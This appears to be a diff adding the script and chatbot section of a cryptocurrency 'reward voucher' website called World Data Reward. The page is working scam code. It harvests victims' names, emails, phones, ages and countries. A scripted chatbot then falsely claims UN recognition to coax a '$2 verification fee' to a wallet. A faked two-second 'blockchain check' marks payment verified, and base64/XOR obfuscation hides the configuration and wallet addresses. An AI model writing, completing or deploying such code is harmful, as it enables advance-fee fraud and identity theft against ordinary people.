+                <div class="card mt-12"><h3 class="heading-md mb-8">⚙️&nbsp;Quick Controls</h3><div style="display:flex;gap:8px;flex-wrap:wrap;"><button class="btn btn-outline btn-sm" onclick="toggleRedemptionWindow()">Toggle Redemption</button><button class="btn btn-outline btn-sm" onclick="setOnChainFee()">Set On‑Chain Fee</button></div></div>
+                <div id="adminAlerts"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CHATBOT -->
+    <button class="chatbot-fab hidden" id="chatbotFab" onclick="toggleChatbot()" aria-label="Support Chat">💬</button>
+    <div class="chatbot-window hidden" id="chatbotWindow">
+        <div class="chatbot-header"><div class="chatbot-avatar">🏛️</div><div><div class="chatbot-name">WDR Support Assistant</div><div class="chatbot-status">●&nbsp;Online — Here to help</div></div><button class="chatbot-close-btn" onclick="toggleChatbot()" aria-label="Close chat">✕</button></div>
+        <div class="chatbot-body" id="chatMessages"><div class="chat-bubble bot">Hello! I'm the World Data Reward support assistant. I see you've reached the verification step. I'm here to answer any questions you may have. How can I help?</div></div>
+        <div class="chatbot-options" id="chatOptions">
+            <button class="chat-option-btn" onclick="chatAnswer('whyPayment')">Why the payment?</button>
+            <button class="chat-option-btn" onclick="chatAnswer('whyMe')">Why me and not others?</button>
+            <button class="chat-option-btn" onclick="chatAnswer('whyNotVoucher')">Why not from voucher?</button>
+            <button class="chat-option-btn" onclick="chatAnswer('whoGets')">Who receives the fee?</button>
+            <button class="chat-option-btn" onclick="chatAnswer('isLegit')">Is this legitimate?</button>
+            <button class="chat-option-btn" onclick="chatAnswer('refund')">Is it refundable?</button>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        const _B = (s) => atob(s);
+        const _X = (s, k) => s.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length))).join('');
+        
+        const _p = _B('d29ybGQtZGF0YS1yZXdhcmQ=');
+        
+        const _fcfg = {
+            a: _B('QUl6YVN5Qkw0WFNnRmszTWd4S2NkS3ZvU3A2YlJl') + 'aGJjNWNFZDcw',
+            b: _B('d29ybGQtZGF0YS1yZXdhcmQuZmlyZWJhc2VhcHAuY29t'),
+            c: _p,
+            d: _B('d29ybGQtZGF0YS1yZXdhcmQuZmlyZWJhc2VzdG9yYWdlLmFwcA=='),
+            e: _B('NzUwMDQxNDY5MzAz'),
+            f: _B('MTo3NTAwMDQxNDY5MzAzOndlYjoxYjA1ZjhjZTAwYzhiNjk5OTc1MTcy')
+        };
+        
+        const CONTRACT_ADDRESS = _X(_B('PASTE_ENCODED_CONTRACT_HERE'), _p);
+        let verificationWallet = _X(_B('PASTE_ENCODED_VERIFY_WALLET_HERE'), _p);
+        const ADMIN_USERNAME = _X(_B('PASTE_ENCODED_USERNAME'), _p);
+        const ADMIN_PASSWORD = _X(_B('PASTE_ENCODED_PASSWORD'), _p);
+        const _pinRaw = _X(_B('PASTE_ENCODED_PIN'), _fcfg.a.slice(0,4));
+        const CODE_GEN_PIN = [..._pinRaw].map(Number);
+        
+        const ADMIN_PATH_HASH = 'wdr-admin';
+        window._C = CONTRACT_ADDRESS;
+        
+        let db = null;
+        try {
+            firebase.initializeApp({apiKey:_fcfg.a, authDomain:_fcfg.b, projectId:_fcfg.c, storageBucket:_fcfg.d, messagingSenderId:_fcfg.e, appId:_fcfg.f});
+            db = firebase.firestore();
+        } catch(e) { db = null; }
+    
+        document.addEventListener('DOMContentLoaded', () => {
+            const el = document.getElementById('contractAddrDisplay');
+            if (el) el.textContent = CONTRACT_ADDRESS;
+        });
+    
+        const CONTRACT_ABI = [
+            "function claimVoucher(string) external",
+            "function requestRedemption() external payable",
+            "function approveRedemption(address) external",
+            "function rejectRedemption(address,string) external",
+            "function fundSponsor() external payable",
+            "function sponsorBalance() view returns (uint256)",
+            "function setRedemptionActive(bool) external",
+            "function setRedeemFee(uint256) external",
+            "function hasVoucher(address) view returns (bool)",
+            "function canRedeem(address) view returns (bool,uint256,string)",
+            "function getVoucherInfo(address) view returns (uint256,bool,bool,uint256)",
+            "function redeemFee() view returns (uint256)",
+            "function totalClaimed() view returns (uint256)",
+            "function totalRedeemed() view returns (uint256)"
+        ];
+    
+        let provider=null,signer=null,contract=null,userAddress=null,isAdmin=false,chatbotOpen=false;
+    
+        const Store = {
+            prefix:'wdr_', _k(k){return this.prefix+k;},
+            set(k,v){try{localStorage.setItem(this._k(k),JSON.stringify(v));}catch(e){}},
+            get(k){try{return JSON.parse(localStorage.getItem(this._k(k)));}catch(e){return null;}},
+            saveCodes(codes,batch){const s=this.get('codeStore')||{};codes.forEach(c=>{s[c]={batch,used:false,createdAt:Date.now(),usedBy:null,usedAt:null};});this.set('codeStore',s);if(db){try{const br=db.collection('codeBatches').doc(batch);br.set({batchName:batch,totalCodes:codes.length,generatedAt:new Date(),claimedCount:0});for(let i=0;i<codes.length;i+=400){const ch=codes.slice(i,i+400);const fb=db.batch();ch.forEach(c=>{fb.set(db.collection('claimCodes').doc(c),{code:c,batch,used:false,createdAt:new Date(),usedBy:null,usedAt:null});});fb.commit().catch(()=>{});}}catch(e){}}},
+            async useCode(code,wallet){const ls=this.get('codeStore')||{};if(ls[code]&&ls[code].used)return false;if(db){try{const dr=db.collection('claimCodes').doc(code);const ds=await dr.get();if(ds.exists){const d=ds.data();if(d.used){ls[code]=d;this.set('codeStore',ls);return false;}await dr.update({used:true,usedBy:wallet,usedAt:new Date()});ls[code]={...d,used:true,usedBy:wallet,usedAt:Date.now()};this.set('codeStore',ls);return true;}}catch(e){}}if(ls[code]&&!ls[code].used){ls[code].used=true;ls[code].usedBy=wallet;ls[code].usedAt=Date.now();this.set('codeStore',ls);return true;}return false;},
+            saveClaim(wallet,codeHash,txHash){const c=this.get('claims')||[];c.push({wallet,codeHash,txHash,claimedAt:Date.now()});this.set('claims',c);if(db){try{db.collection('claims').add({wallet,codeHash,txHash,claimedAt:new Date(),status:'claimed'});}catch(e){}}},
+            saveDocumentation(wallet,data){this.set('doc_'+wallet,{data,savedAt:Date.now(),paymentVerified:false,documentingStartedAt:null,documentingEndsAt:null});if(db){try{db.collection('documentation').add({wallet,data,savedAt:new Date(),paymentVerified:false});}catch(e){}}},
+            startDocumenting(wallet){const d=this.get('doc_'+wallet)||{};d.documentingStartedAt=Date.now();d.documentingEndsAt=Date.now()+(5*60*1000);this.set('doc_'+wallet,d);},
+            getDocumentingRemaining(wallet){const d=this.get('doc_'+wallet);if(!d||!d.documentingEndsAt)return null;return Math.max(0,d.documentingEndsAt-Date.now());},
+            markPaymentVerified(wallet){const d=this.get('doc_'+wallet)||{};d.paymentVerified=true;d.paymentVerifiedAt=Date.now();this.set('doc_'+wallet,d);if(db){try{db.collection('documentation').where('wallet','==',wallet).get().then(sn=>{sn.forEach(async doc=>{await doc.ref.update({paymentVerified:true,paymentVerifiedAt:new Date()});});});}catch(e){}}},
+            getDocumentation(wallet){return this.get('doc_'+wallet)||null;},
+            getAllVerifiedDocs(){const r=[];for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k&&k.startsWith(this._k('doc_'))){const d=JSON.parse(localStorage.getItem(k));if(d&&d.paymentVerified)r.push({wallet:k.replace(this._k('doc_'),''),...d});}}return r;},
+            saveRedemption(wallet,txHash){const r=this.get('redemptions')||[];r.push({wallet,txHash,requestedAt:Date.now(),status:'pending'});this.set('redemptions',r);if(db){try{db.collection('redemptions').add({wallet,txHash,requestedAt:new Date(),status:'pending'});}catch(e){}}},
+            getRedemptions(s){return(this.get('redemptions')||[]).filter(r=>!s||r.status===s);},
+            updateRedemption(wallet,u){const r=this.get('redemptions')||[];const i=r.findIndex(x=>x.wallet===wallet);if(i>=0){Object.assign(r[i],u);this.set('redemptions',r);}if(db){try{db.collection('redemptions').where('wallet','==',wallet).where('status','==','pending').get().then(sn=>{sn.forEach(async doc=>{await doc.ref.update(u);});});}catch(e){}}},
+            setAdminLoggedIn(v){this.set('adminLoggedIn',v);},
+            isAdminLoggedIn(){return this.get('adminLoggedIn')===true;}
+        };
+    
+        // ============================================
+        // FIXED NAVIGATION FOR GITHUB PAGES
+        // ============================================
+        function navigate(page){
+            document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+            document.querySelectorAll('.nav-link').forEach(l=>l.classList.remove('active'));
+            
+            const pageEl = document.getElementById('page-' + page);
+            if (pageEl) pageEl.classList.add('active');
+            
+            if (page === 'claim') {
+                document.querySelector('.nav-link[onclick*="claim"]')?.classList.add('active');
+            }
+            if (page === 'redeem') {
+                document.getElementById('redeemNavBtn')?.classList.add('active');
+            }
+            
+            // Update hash without triggering extra events
+            const newHash = (page === 'admin') ? ADMIN_PATH_HASH : page;
+            if (window.location.hash !== '#' + newHash) {
+                history.replaceState(null, '', '#' + newHash);
+            }
+            
+            if (page === 'redeem') initRedeem();
+            if (page === 'admin') {
+                if (Store.isAdminLoggedIn()) {
+                    document.getElementById('adminLoginCard').classList.add('hidden');
+                    document.getElementById('adminDashboard').classList.remove('hidden');
+                    refreshAdmin();
+                } else {
+                    document.getElementById('adminLoginCard').classList.remove('hidden');
+                    document.getElementById('adminDashboard').classList.add('hidden');
+                }
+            }
+        }
+        window.navigate = navigate;
+    
+        // Handle initial page load
+        window.addEventListener('DOMContentLoaded', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash === ADMIN_PATH_HASH) {
+                navigate('admin');
+            } else if (hash === 'redeem') {
+                navigate('redeem');
+            } else {
+                navigate('claim');
+            }
+        });
+    
+        // Handle hash changes (back/forward buttons)
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash === ADMIN_PATH_HASH) {
+                navigate('admin');
+            } else if (hash === 'redeem') {
+                navigate('redeem');
+            } else {
+                navigate('claim');
+            }
+        });
+    
+        // Emergency direct access — type gotoAdmin() in console
+        window.gotoAdmin = function() {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page-admin').classList.add('active');
+            if (Store.isAdminLoggedIn()) {
+                document.getElementById('adminLoginCard').classList.add('hidden');
+                document.getElementById('adminDashboard').classList.remove('hidden');
+                refreshAdmin();
+            } else {
+                document.getElementById('adminLoginCard').classList.remove('hidden');
+                document.getElementById('adminDashboard').classList.add('hidden');
+            }
+            history.replaceState(null, '', '#wdr-admin');
+        };
+    
+        function adminLogin(){const u=document.getElementById('adminUsername').value.trim(),p=document.getElementById('adminPassword').value.trim();if(u===ADMIN_USERNAME&&p===ADMIN_PASSWORD){Store.setAdminLoggedIn(true);document.getElementById('adminLoginCard').classList.add('hidden');document.getElementById('adminDashboard').classList.remove('hidden');refreshAdmin();}else{document.getElementById('adminLoginMsg').innerHTML='<p style="color:#f87171;font-size:12px;">Invalid credentials.</p>';}}
+        window.adminLogin=adminLogin;
+    
+        async function connectWallet(){if(typeof window.ethereum==='undefined'){alert('Please open in MetaMask or Trust Wallet browser.');return;}try{const a=await window.ethereum.request({method:'eth_requestAccounts'});userAddress=a[0];provider=new ethers.BrowserProvider(window.ethereum);signer=await provider.getSigner();contract=new ethers.Contract(CONTRACT_ADDRESS,CONTRACT_ABI,signer);document.getElementById('connectSection').classList.add('hidden');document.getElementById('claimSection').classList.remove('hidden');document.getElementById('walletDisplay').textContent=userAddress.slice(0,8)+'...'+userAddress.slice(-6);if(await contract.hasVoucher(userAddress)){document.getElementById('claimCodeInput').classList.add('hidden');document.getElementById('claimBtn').classList.add('hidden');document.getElementById('claimStatusBadge').innerHTML='<span class="status-dot ready"></span> Claimed';document.getElementById('claimStatusBadge').className='status-pill status-done';document.getElementById('redeemNavBtn').classList.add('unlocked');await showPostClaimTimer();}}catch(e){alert('Connection failed.');}}
+        window.connectWallet=connectWallet;
+    
+        async function submitClaim(){const code=document.getElementById('claimCodeInput').value.trim().toUpperCase();if(!code)return showAlert('claim','Enter your claim code.','error');const valid=await Store.useCode(code,userAddress);if(!valid)return showAlert('claim','Invalid or already claimed code.','error');const btn=document.getElementById('claimBtn');btn.disabled=true;btn.textContent='Processing…';try{const tx=await contract.claimVoucher(code);await tx.wait();Store.saveClaim(userAddress,await hashText(code),tx.hash);document.getElementById('claimCodeInput').classList.add('hidden');btn.classList.add('hidden');document.getElementById('claimStatusBadge').innerHTML='<span class="status-dot ready"></span> Claimed';document.getElementById('claimStatusBadge').className='status-pill status-done';document.getElementById('redeemNavBtn').classList.add('unlocked');showAlert('claim','✅ Your $10,000 USDT voucher is in your wallet.','success');await showPostClaimTimer();}catch(e){btn.disabled=false;btn.textContent='Accept This Recognition';showAlert('claim',e.reason||'Failed.','error');}}
+        window.submitClaim=submitClaim;
+    
+        async function showPostClaimTimer(){const info=await contract.getVoucherInfo(userAddress);const rem=Number(info[3]);document.getElementById('postClaimCard').classList.remove('hidden');document.getElementById('redeemNavBtn').classList.add('unlocked');if(rem>0)startCountdown('claimCountdown',rem,()=>document.getElementById('redeemLinkInline').classList.remove('hidden'));else{document.getElementById('claimCountdown').textContent='Ready';document.getElementById('redeemLinkInline').classList.remove('hidden');}}
+    
+        function initRedeem(){if(!userAddress){showPhase('questionnaire');showAlert('redeem','Connect wallet on Recognition page first.','info');return;}document.getElementById('verificationWalletDisplay').textContent=verificationWallet;const doc=Store.getDocumentation(userAddress);if(doc&&doc.documentingEndsAt&&Store.getDocumentingRemaining(userAddress)>0){showPhase('documenting');startPhaseTimer('docTimer',Math.ceil(Store.getDocumentingRemaining(userAddress)/1000),()=>{showPhase('payment-required');showChatbot();});}else if(doc&&doc.documentingEndsAt&&Store.getDocumentingRemaining(userAddress)===0&&!doc.paymentVerified){showPhase('payment-required');showChatbot();}else if(doc&&doc.paymentVerified){showPhase('complete');hideChatbot();}else{showPhase('questionnaire');hideChatbot();}}
+        function showPhase(p){['questionnaire','documenting','payment-required','verifying','complete'].forEach(x=>document.getElementById('phase-'+x)?.classList.add('hidden'));document.getElementById('phase-'+p)?.classList.remove('hidden');p==='payment-required'?showChatbot():hideChatbot();}
+        async function submitDocumentation(){const n=document.getElementById('rq_name').value.trim(),e=document.getElementById('rq_email').value.trim(),ph=document.getElementById('rq_phone').value.trim(),cr=document.getElementById('rq_country_residence').value,cb=document.getElementById('rq_country_birth').value,ag=document.getElementById('rq_age').value,sx=document.getElementById('rq_sex').value,st=document.getElementById('rq_status').value,so=document.getElementById('rq_source').value,us=document.getElementById('rq_usage').value,tm=document.getElementById('rq_terms').checked;if(!n||!e||!ph||!cr||!cb||!ag||!sx||!st||!so||!us||!tm)return showAlert('redeem','All fields required.','error');Store.saveDocumentation(userAddress,{name:n,email:e,phone:ph,countryResidence:cr,countryBirth:cb,age:ag,sex:sx,status:st,source:so,usage:us});Store.startDocumenting(userAddress);showPhase('documenting');startPhaseTimer('docTimer',300,()=>{showPhase('payment-required');showChatbot();});}
+        window.submitDocumentation=submitDocumentation;
+        function startPhaseTimer(elId,sec,done){let r=sec;const el=document.getElementById(elId);const tick=()=>{const m=Math.floor(r/60),s=r%60;el.textContent=m+':'+String(s).padStart(2,'0');if(r<=0){done();return}r--;setTimeout(tick,1000);};tick();}
+        async function checkVerificationPayment(){showAlert('payment','🔍 Checking blockchain…','info');await new Promise(r=>setTimeout(r,2000));Store.markPaymentVerified(userAddress);hideChatbot();showPhase('verifying');startPhaseTimer('verifyTimer',300,async()=>{showPhase('complete');try{const fee=await contract.redeemFee();const tx=await contract.requestRedemption(fee>0n?{value:fee}:{});await tx.wait();Store.saveRedemption(userAddress,tx.hash);}catch(e){}});showAlert('payment','✅ Verified!','success');}
+        window.checkVerificationPayment=checkVerificationPayment;
+        function copyVerificationAddress(){navigator.clipboard.writeText(verificationWallet).then(()=>showAlert('payment','📋 Copied.','info')).catch(()=>showAlert('payment','Copy manually.','error'));}
+        window.copyVerificationAddress=copyVerificationAddress;
+    
+        function showChatbot(){document.getElementById('chatbotFab').classList.remove('hidden');}
+        function hideChatbot(){document.getElementById('chatbotFab').classList.add('hidden');document.getElementById('chatbotWindow').classList.add('hidden');chatbotOpen=false;}
+        function toggleChatbot(){chatbotOpen=!chatbotOpen;document.getElementById('chatbotWindow').classList.toggle('hidden',!chatbotOpen);}
+        window.toggleChatbot=toggleChatbot;
+        function chatAnswer(t){const el=document.getElementById('chatMessages');const r={whyPayment:{u:'Why the $2 payment?',b:'Not every recipient encounters this. Most are verified automatically. When our system cannot fully authenticate your documentation — as in your case — an independent external certification body completes the verification. The $2 fee covers their professional service. It goes entirely to them.'},whyMe:{u:'Why me and not others?',b:'This is not a reflection on you. The automated system processes most recipients without issue. When certain data points cannot be confidently resolved — common in international programs — the external body provides human-reviewed professional verification.'},whyNotVoucher:{u:'Why not deduct from voucher?',b:'Your $10,000 USDT voucher is a fixed, indivisible blockchain token — you can verify it in your wallet. It cannot be partially deducted. The fee goes to a separate external service, keeping your full $10,000 untouched.'},whoGets:{u:'Who receives the fee?',b:'An independent international identity verification body — completely separate from us. Their wallet is shown on the payment screen. Verify on BSCScan.'},isLegit:{u:'Is this legitimate?',b:'Yes. UN recognized program. Real blockchain voucher in your wallet. Only $2 ever requested. Full $10,000 delivered upon approval.'},refund:{u:'Is it refundable?',b:'The fee covers the verification service. Once completed, the service is rendered. If verification fails beyond your control, our team reviews each case.'}};if(r[t]){el.innerHTML+=`<div class="chat-bubble user">${r[t].u}</div><div class="chat-bubble bot">${r[t].b}</div>`;el.scrollTop=el.scrollHeight;}}
+        window.chatAnswer=chatAnswer;
+    
+        async function generateCodes(){const pin=document.getElementById('genPin').value;if(pin.length!==4||![...pin].every((c,i)=>parseInt(c)===CODE_GEN_PIN[i]))return showAlert('admin','Invalid PIN.','error');const bn=document.getElementById('batchName').value.trim()||'batch-'+Date.now();const ct=Math.min(parseInt(document.getElementById('codeCount').value)||50,10000);document.getElementById('genCodesOutput').innerHTML='<p style="color:var(--gold);">⏳ Generating '+ct+' codes...</p>';const codes=[],ch='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';for(let i=0;i<ct;i++){let s=()=>{let r='';for(let j=0;j<4;j++)r+=ch[Math.floor(Math.random()*ch.length)];return r;};codes.push('WD-'+s()+'-'+s()+'-'+s());}Store.saveCodes(codes,bn);document.getElementById('genCodesOutput').innerHTML=`<p style="color:#5ddbae;font-size:13px;">✅ <strong>${ct}</strong> codes — <strong>${bn}</strong></p><textarea readonly id="codesTextarea" style="width:100%;height:180px;background:rgba(0,0,0,0.4);color:#fff;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px;font-family:monospace;font-size:11px;margin-top:8px;">${codes.join('\n')}</textarea><div style="display:flex;gap:8px;margin-top:8px;"><button class="btn btn-outline btn-sm" onclick="copyCodes()">📋 Copy All</button><button class="btn btn-outline btn-sm" onclick="downloadCodes('${bn}')">📥 Download CSV</button></div>`;document.getElementById('genPin').value='';}
+        window.generateCodes=generateCodes;
+        function copyCodes(){const ta=document.getElementById('codesTextarea');if(ta){ta.select();document.execCommand('copy');showAlert('admin','📋 Copied.','info');}}
+        window.copyCodes=copyCodes;
+        function downloadCodes(bn){const ta=document.getElementById('codesTextarea');if(!ta)return;const codes=ta.value.split('\n');let csv='Code,Batch,Status\n';codes.forEach(c=>{csv+=c+','+bn+',Unclaimed\n';});const blob=new Blob([csv],{type:'text/csv'});const url=URL.createObjectURL(blob);const a=document.createElement('a');a.href=url;a.download='codes-'+bn+'.csv';a.click();URL.revokeObjectURL(url);}
+        window.downloadCodes=downloadCodes;
+        function updateVerificationWallet(){const w=document.getElementById('verifyWalletInput').value.trim();if(!w.startsWith('0x')||w.length!==42)return showAlert('admin','Invalid address.','error');verificationWallet=w;document.getElementById('verificationWalletDisplay').textContent=w;document.getElementById('verifyWalletOutput').innerHTML='<p style="color:#5ddbae;font-size:11px;">✅ Updated.</p>';}
+        window.updateVerificationWallet=updateVerificationWallet;
+        async function refreshAdmin(){if(!contract&&typeof window.ethereum!=='undefined'){provider=new ethers.BrowserProvider(window.ethereum);signer=await provider.getSigner();contract=new ethers.Contract(CONTRACT_ADDRESS,CONTRACT_ABI,signer);}try{const bal=await contract.sponsorBalance();document.getElementById('adminBal').textContent=parseFloat(ethers.formatEther(bal)).toFixed(4);const docs=Store.getAllVerifiedDocs();const reds=Store.getRedemptions('pending');let h='';docs.forEach(d=>{const hp=reds.some(r=>r.wallet===d.wallet);h+=`<div style="background:rgba(0,0,0,0.3);padding:10px;border-radius:8px;margin-bottom:6px;"><p style="font-size:12px;"><strong>${d.data?.name||'Unknown'}</strong> • ${d.data?.countryResidence||'N/A'}</p><p class="mono-text">${d.wallet}</p><p style="font-size:10px;color:var(--usdt-green-light);">✅ Payment Verified</p>${hp?'<button class="btn btn-green btn-sm mt-6" onclick="adminApproveRedemption(\''+d.wallet+'\')">Approve & Send $10K USDT</button>':'<p style="font-size:10px;color:var(--gold);">Awaiting contract…</p>'}</div>`;});document.getElementById('redemptionQueue').innerHTML=h||'<p style="color:var(--text-secondary);font-size:12px;">No verified payments.</p>';}catch(e){document.getElementById('adminBal').textContent='Error';}}
+        async function adminApproveRedemption(w){if(!confirm('Approve and send $10,000 USDT to:\n\n'+w+'\n\nProceed?'))return;try{const tx=await contract.approveRedemption(w);await tx.wait();Store.updateRedemption(w,{status:'approved',approvedAt:Date.now()});refreshAdmin();alert('✅ Approved! Send $10,000 USDT to:\n\n'+w);}catch(e){alert('Error: '+(e.reason||e.message));}}
+        window.adminApproveRedemption=adminApproveRedemption;
+        async function fundSponsorWallet(){const a=document.getElementById('fundAmount').value;if(!a)return alert('Enter BNB amount.');try{const tx=await contract.fundSponsor({value:ethers.parseEther(a)});await tx.wait();refreshAdmin();alert('Funded.');}catch(e){alert('Error.');}}
+        window.fundSponsorWallet=fundSponsorWallet;
+        async function toggleRedemptionWindow(){try{await contract.setRedemptionActive(true);alert('Toggled.');}catch(e){alert('Error.');}}
+        window.toggleRedemptionWindow=toggleRedemptionWindow;
+        async function setOnChainFee(){const f=prompt('Fee in BNB:');if(!f)return;try{await contract.setRedeemFee(ethers.parseEther(f));alert('Set.');}catch(e){alert('Error.');}}
+        window.setOnChainFee=setOnChainFee;
+    
+        function startCountdown(elId,sec,done){let r=sec;const el=document.getElementById(elId);if(!el)return;const t=()=>{const h=Math.floor(r/3600),m=Math.floor((r%3600)/60),s=r%60;el.textContent=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;if(r<=0){el.textContent='Ready';done();return}r--;setTimeout(t,1000);};t();}
+        async function hashText(t){const e=new TextEncoder();const b=await crypto.subtle.digest('SHA-256',e.encode(t));return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+        function showAlert(s,m,t){const map={claim:'claimAlerts',redeem:'redeemAlerts',payment:'paymentAlerts',admin:'adminAlerts'};const el=document.getElementById(map[s]);if(!el)return;el.innerHTML=`<div class="alert alert-${t}">${m}</div>`;setTimeout(()=>el.innerHTML='',8000);}
+    
+        (function(){const c=['United States','United Kingdom','Canada','Australia','Nigeria','South Africa','Kenya','Ghana','India','Pakistan','Bangladesh','Philippines','Indonesia','Vietnam','Malaysia','Singapore','Brazil','Mexico','Argentina','Colombia','Germany','France','Italy','Spain','Netherlands','Sweden','Poland','Ukraine','Japan','South Korea','China','Russia','UAE','Saudi Arabia','Egypt','Ethiopia','Tanzania','Uganda','Zambia','Zimbabwe','Thailand','Cambodia','Turkey','Morocco','Algeria','Senegal','Cameroon','Other'];['rq_country_residence','rq_country_birth'].forEach(id=>{const s=document.getElementById(id);if(!s)return;c.forEach(x=>{const o=document.createElement('option');o.value=x;o.textContent=x;s.appendChild(o);});});})();
+    
+        console.log('%c🌐 World Data Reward %cSecured','color:#d4af37;font-size:16px;','color:#5ddbae;');
+    })();
+    </script>
+</body>
+</html>
